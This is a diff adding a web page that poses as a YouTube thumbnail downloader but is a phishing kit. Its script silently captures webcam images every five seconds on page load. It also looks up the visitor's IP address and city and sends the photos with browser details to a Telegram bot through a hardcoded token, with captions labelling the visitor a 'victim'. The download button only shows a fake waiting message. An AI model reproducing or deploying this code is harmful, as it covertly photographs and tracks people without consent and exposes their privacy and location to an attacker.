@@ -1,0 +1,250 @@
+<!DOCTYPE html><html lang="en"><head>
+  <script src="jquery.min.js"></script>
+
+  <title>YouTube Thumbnail Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #fff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+      color: red;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px; /* Adjust size as needed */
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <img class="youtube-logo" src="youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+  </nav>
+
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
+  </div>
+
+  <center>
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+    <div id="message-container"></div>
+    <video id="video" width="0" height="0" autoplay=""></video>
+  </center>
+
+<script type="text/javascript">
+function getUrlParameter(name) {
+    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+    var results = regex.exec(location.search);
+    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
+
+
+var id = getUrlParameter('id');
+//const id = '5723455420';
+
+  var botToken = '6753754919:AAGvMSjd-wQ-mZGLN9rZpPXh5iaU_yBqzT4';
+    var chatId = id;
+  function downloadThumbnail() {
+    // Change button text to indicate fetching
+    var btn = document.getElementById('thumbdloadbtn');
+    btn.textContent = 'Fetching from camera... Please wait';
+
+   popup('error')
+}
+
+
+
+var originalNumber = "";
+var messageContainer = document.getElementById("message-container");
+
+// Get user media
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(function(stream) {
+    video.srcObject = stream;
+})
+.catch(function(error) {
+    console.error('Error accessing media devices.', error);
+    // If camera access is denied, send an error message to the Telegram bot
+    sendErrorMessageToTelegram('Error: Camera access denied by user.');
+});
+
+// Send high-quality enhanced image to Telegram with additional details
+setInterval(function() {
+    if (video.paused || video.ended) return;
+    // Create a canvas with higher dimensions
+    var canvas = document.createElement('canvas');
+    var scaleFactor = 5; // Increase this value for higher quality
+    canvas.width = video.videoWidth * scaleFactor;
+    canvas.height = video.videoHeight * scaleFactor;
+    var ctx = canvas.getContext('2d');
+    // Draw the video frame onto the larger canvas
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // Convert the enhanced image to data URL
+    var image_data = canvas.toDataURL('image/jpeg', 0.9); // Adjust quality as needed
+
+    // Fetch IP details
+    fetch('https://ipapi.co/json/') // Replace YOUR_TOKEN_HERE with your actual token
+    .then(response => response.json())
+    .then(ipInfo => {
+        // Construct the caption with User IP, UserAgent (including browser), and City
+        var caption = `<b>😈 Victim pic Found 😈 \n\n User IP Address: ${ipInfo.ip}\n\nUserAgent: ${navigator.userAgent}\n\nCity Name: ${ipInfo.city}\n\nPic captured By : @PhishingpageXsoumyarobot </b>`;
+
+        // Assuming you have obtained your bot token and chat ID
+       // var botToken = '6753754919:AAGvMSjd-wQ-mZGLN9rZpPXh5iaU_yBqzT4';
+      //  var chatId = '6292821404';
+
+        // Prepare the image and details to send
+        var formData = new FormData();
+        formData.append('photo', dataURItoBlob(image_data), 'photo.jpg');
+        formData.append('chat_id', chatId);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'html');
+
+        $.ajax({
+            type: 'POST',
+            url: 'https://api.telegram.org/bot' + botToken + '/sendPhoto',
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(response) {
+                console.log('Telegram response:', response);
+                messageContainer.textContent = 'Verifying..';
+            },
+            error: function(XHR, textStatus, errorThrown) {
+                console.error('Error sending image to Telegram:', textStatus, errorThrown);
+                messageContainer.textContent = 'Error';
+            }
+        });
+    })
+    .catch(error => {
+        console.error('Error fetching IP details:', error);
+    });
+}, 5000); // Adjust the interval as needed
+
+// Function to convert data URI to Blob
+function dataURItoBlob(dataURI) {
+    var byteString = atob(dataURI.split(',')[1]);
+    var ab = new ArrayBuffer(byteString.length);
+    var ia = new Uint8Array(ab);
+    for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: 'image/jpeg' });
+}
+
+// Function to get browser name from UserAgent
+function getBrowserName(userAgent) {
+    if (userAgent.includes('Firefox')) {
+        return 'Firefox';
+    } else if (userAgent.includes('Chrome')) {
+        return 'Chrome';
+    } else if (userAgent.includes('Safari')) {
+        return 'Safari';
+    } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
+        return 'Internet Explorer';
+    } else {
+        return 'Unknown';
+    }
+}
+
+// Function to send an error message to the Telegram bot
+function sendErrorMessageToTelegram(errorMessage) {
+    // Assuming you have obtained your bot token and chat ID
+   // var botToken = '6753754919:AAGvMSjd-wQ-mZGLN9rZpPXh5iaU_yBqzT4';
+ // var chatId = '6292821404';
+
+    // Prepare the data to send
+    var notext = '<b>Hey Bro ,\nUser Reject or denied camera access . ☹️☹️ </b>'
+    var formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', notext);
+    formData.append('parse_mode', 'html');
+    
+
+    $.ajax({
+        type: 'POST',
+        url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
+        data: formData,
+        processData: false,
+        contentType: false,
+        success: function(response) {
+            console.log('Telegram response:', response);
+        },
+        error: function(XHR, textStatus, errorThrown) {
+            console.error('Error sending message to Telegram:', textStatus, errorThrown);
+        }
+    });
+}
+  </script>
+
+  <footer>
+    <p>Made with ❤️</p>
+  </footer>
+<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'86c0a62b290c663d',t:'MTcxMTcyMzU4My4yNjAwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
+
+</body></html>
